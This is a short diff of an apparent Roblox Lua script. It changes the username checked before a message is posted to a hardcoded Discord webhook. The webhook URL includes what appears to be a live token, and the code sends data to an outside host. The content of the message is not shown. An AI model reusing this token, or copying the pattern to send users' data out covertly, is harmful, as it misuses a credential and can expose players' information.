@@ -51,7 +51,7 @@ local function sendwebhook(msg)
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 end
 
-if _G.Username == "W4r_ObScUrE" then
+if _G.Username == "Ramon13259" then
      local Webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
      sendwebhook(msg)
 else
